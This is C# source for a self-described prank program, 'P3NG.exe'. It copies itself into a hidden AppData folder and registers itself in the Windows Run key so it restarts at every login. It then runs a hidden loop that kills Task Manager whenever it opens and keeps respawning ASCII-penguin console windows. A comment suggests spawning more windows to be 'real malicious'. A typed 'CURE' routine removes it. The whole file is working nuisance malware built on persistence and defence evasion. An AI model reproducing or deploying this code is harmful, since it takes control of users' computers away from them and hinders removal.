using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System;

/*

:: ---------------- ::
::                  ::
::     P3NG.exe     ::
::      v1.0.1      ::
::                  ::
::  Bryant Finnern  ::
::    p3ng00.com    ::
::                  ::
:: ---------------- ::
::                  ::
::     Created      ::
::    2021.11.10    ::
::                  ::
::      Edited      ::
::    2021.11.13    ::
::                  ::
:: ---------------- ::

*/

class Penguin
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const string TITLE = "ASCII_Penguin";

    const string strHidden = "HIDDEN";
    const string strDisplay = "DISPLAY";
    const string strCure = "CURE";

    static readonly Random random = new Random();
    static readonly DirectoryInfo destDir = new DirectoryInfo("C:/Users/" + Environment.GetEnvironmentVariable("username") + "/AppData/Local/speech/P3");
    static readonly FileInfo destFile = new FileInfo(destDir + "/" + TITLE + ".exe");
    static readonly RegistryKey destRegKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

    static void Main(string[] args)
    {
        Console.Title = TITLE;

        if (args.Length == 0)
        {
            WindowFirstRun();
        }
        else
        {
            switch (args[0])
            {
                // Hidden Window
                // (Creates Penguin Windows
                // and kill Task Manager)
                case strHidden:
                    WindowHidden();
                    break;

                // Display Window
                // (Window that displays
                // the penguins)
                case strDisplay:
                    WindowDisplay();
                    break;

                // Cure Window
                // (Window that runs
                // the cure process)
                case strCure:
                    WindowCure();
                    break;
            }
        }
    }

    static void WindowFirstRun()
    {
        string p3ngArray =
            "\n" + @"         /@@@@@@@\" +
            "\n" + @"       (@@@@@ # @@@@@\" +
            "\n" + @"      (` \@@@@@@@@~~~~" +
            "\n" + @"     /`    \@@@@@|" +
            "\n" + @"    /@@     ''''  \" +
            "\n" + @"   /@@@@\          |" +
            "\n" + @"  /@@@@@@@\        |" +
            "\n" + @" /@@@@@@@@@        |" +
            "\n" + @" |@@@@@@@@         |" +
            "\n" + @" |@@@@@@@          |" +
            "\n" + @" |@@@@@@@          |" +
            "\n" + @" |@@@'@@@@        |" +
            "\n" + @" |@@@ '@@@        ;" +
            "\n" + @" |@@@  @@;       ;" +
            "\n" + @" |@@@  ''       ;" +
            "\n" + @" (@@@@         ;" +
            "\n" + @"  (@@@@        |" +
            "\n" + @"   (__@@_______)" +
            "\n" + @"" +
            "\n" + @"  ... he watches...";

        // DONT FUCK WITH WIDTH.
        // ANY LOWER AND HE
        // SQUISHES EVERYWHERE.
        int windowWidth = 23;
        int windowHeight = 21;

        // Set window size (WINDOW BEFORE BUFFER ALWAYS)
        Console.SetWindowSize(windowWidth, windowHeight);
        Console.SetBufferSize(Console.WindowLeft + windowWidth, Console.WindowTop + windowHeight);

        // Display Penguin
        Console.Write(p3ngArray);

        // If destination directory doesn't exist...
        if (!destDir.Exists)
        {
            // Create destination directory
            destDir.Create();
        }

        // Hide directory
        destDir.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

        // If destination file exists...
        if (destFile.Exists)
        {
            try
            {
                // Attempt deletion (may throw exception)
                destFile.Delete();
            }
            catch (Exception) { }
        }

        // DONT COMBINE THIS TRY WITH THE TRY ABOVE.
        // THE TRY ABOVE IS SURROUNDED BY
        // AN IF STATEMENT YOU HIGH ASS BITCH
        try
        {
            // Copy this program to desination
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, destFile.ToString());

            // Add startup registry key
            Registry.SetValue(destRegKey.ToString(), TITLE, destFile.ToString().Replace("/", @"\") + " " + strHidden);

            // Write a space to show that this was successful
            Console.Write(" ");
        }
        catch (Exception) { }

        // Hangs program.
        // If user types out 'CURE'
        // it will go to the Cure Window.
        while (true)
        {
            // 'true' is put on all of these
            // to always prevent the key from
            // displaying in the console.
            if (Console.ReadKey(true).Key == ConsoleKey.C)
            {
                if (Console.ReadKey(true).Key == ConsoleKey.U)
                {
                    if (Console.ReadKey(true).Key == ConsoleKey.R)
                    {
                        if (Console.ReadKey(true).Key == ConsoleKey.E)
                        {
                            WindowCure();
                            break;
                        }
                    }
                }
            }
        }
    }

    static void WindowHidden()
    {
        int currWindowCount = 0;
        // 'lastPengCount' set to 2 as a minimum to account for host process and creation of one hidden window
        int minPengWindows = 2;
        int lastSecond = -1;
        int currSecond = -1;
        int windowDifference;
        int i;

        while (true)
        {
            currSecond = DateTime.Now.Second;

            if (lastSecond != currSecond)
            {
                Console.SetWindowSize(1, 1);

                // settings i know:
                // 0 = hidden
                // 5 = shown
                ShowWindow(GetConsoleWindow(), 0);
                lastSecond = currSecond;

                if (currWindowCount > minPengWindows)
                {
                    minPengWindows = currWindowCount;
                }

                currWindowCount = 0;

                foreach (Process process in Process.GetProcesses())
                {
                    switch (process.ProcessName)
                    {
                        case TITLE:
                            currWindowCount++;
                            break;

                        case "Taskmgr":
                            try
                            {
                                // Starting the process killer and message box
                                // in a new thread to avoid the thread from
                                // stopping while the message box is open.
                                new Thread(() =>
                                {
                                    process.Kill();
                                    MessageBox.Show("Task Manager Error: Penguins have taken over!");
                                }).Start();
                            }
                            catch (Exception) { }
                            break;
                    }
                }

                windowDifference = minPengWindows - currWindowCount;

                // For each window that doesn't exist...
                for (i = 0; i < windowDifference; i++)
                {
                    // Create a new window
                    CreateDisplayWindow();

                    // IF YOU WANNA BE REAL MALICIOUS
                    // CREATE MORE THAN ONE WINDOW
                    // FOR EACH CLOSED WINDOW
                }
            }
        }
    }

    // This handles the windows that display the penguins
    static void WindowDisplay()
    {
        string asciiStr =
            "\n" + @"       .     .                       *** **" +
            "\n" + @"                !      .           ._*.                       ." +
            "\n" + @"             - -*- -       .-'-.   !  !     ." +
            "\n" + @"    .    .      *       .-' .-. '-.!  !             .              ." +
            "\n" + @"               ***   .-' .-'   '-. '-.!    ." +
            "\n" + @"       *       ***.-' .-'         '-. '-.                   ." +
            "\n" + @"       *      ***$*.-'               '-. '-.     *" +
            "\n" + @"  *   ***     * ***     ___________     !-..!-.  *     *         *    *" +
            "\n" + @"  *   ***    **$** *   !__!__!__!__!    !    !  ***   ***    .   *   ***" +
            "\n" + @" *** ****    * *****   !__!__!__!__!    !      .***-.-*** *     *** * #_" +
            "\n" + @"**********  * ****$ *  !__!__!__!__!    !-..--'*****   # '*-..---# ***" +
            "\n" + @"**** *****  * $** ***      .            !      *****     ***       ***" +
            "\n" + @"************ ***** ***-..-' -.._________!     *******    ***      *****" +
            "\n" + @"***********   .-#.-'           '-.-''-..!     *******   ****...     #" +
            "\n" + @"  # ''-.---''                           '-....---#..--'****** ''-.---''-" +
            "\n" + @"                  Merry Christmas ~ JP3                   #";

        int windowWidth = 78;
        int windowHeight = 27;

        /*

        DO NOT FUCK WTIH THE ORDER OF THE BELOW STATEMENTS

        THE WINDOW SIZE, BUFFER SIZE, COLOR, AND WRITE CALLS
        SEEMS TO NEED TO BE IN A VERY SPECIFIC ORDER AND I
        DEFINITELY DON'T WANT TO GO THROUGH EVERY ITERATION
        AGAIN TO TRY TO FIGURE THIS SHIT OUT.

        */

        // Set Window Title
        Console.Title = "                                  " + TITLE;

        // Set Window Size
        Console.SetWindowSize(windowWidth, windowHeight);

        // Set Buffer Size
        Console.SetBufferSize(Console.WindowLeft + windowWidth, Console.WindowTop + windowHeight);

        // Set color
        Console.BackgroundColor = (ConsoleColor)random.Next(16);
        Console.ForegroundColor = (ConsoleColor)random.Next(16);

        // Clear Console
        Console.Clear();

        // Write to Console
        Console.Write(asciiStr);

        /*

        THIS CONCLUDES THE REGION WITH
        WHICH YOU SHOULD NOT FUCK

        */

        // This hangs the program indefinitely
        while (true)
        {
            Console.ReadKey(true);
        }
    }

    static void WindowCure()
    {
        Console.Clear();
        int windowWidth = 70;
        int windowHeight = 25;
        int count;
        Console.SetWindowSize(windowWidth, windowHeight);
        Console.SetBufferSize(Console.WindowLeft + windowWidth, Console.WindowTop + windowHeight);
        Console.WriteLine("\n " + TITLE + " is being terminated\n");
        Console.WriteLine("Searching for processes...");

        do
        {
            count = 0;

            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == TITLE && process.Id != Process.GetCurrentProcess().Id)
                {
                    try
                    {
                        process.Kill();
                        count++;
                    }
                    catch (Exception) { }
                }
            }

            Console.WriteLine("Killed " + count + " processes.");
            Console.WriteLine("Searching again...");
        }
        while (count > 0);

        Console.WriteLine("\n " + TITLE + " has been terminated.\n");

        // Remove files
        Console.WriteLine("Attempting to remove files...");

        if (destDir.Exists)
        {
            if (destFile.Exists)
            {
                destFile.Delete();
            }

            destDir.Delete(true);

            Console.WriteLine("Deleted");
        }
        else
        {
            Console.WriteLine("Files aren't present");
        }

        // Remove registry key
        try
        {
            destRegKey.DeleteValue(TITLE);
            Console.WriteLine("Removed from startup");
        }
        catch (Exception)
        {
            Console.WriteLine("Not present in registry");
        }

        // Close after user input...
        Console.WriteLine("\n " + TITLE + " has been completely removed.\n");
        Console.Write("Press any key to exit...");
        Console.ReadKey();
    }

    static void CreateDisplayWindow()
    {
        Process.Start(Process.GetCurrentProcess().MainModule.FileName, strDisplay);
    }
}
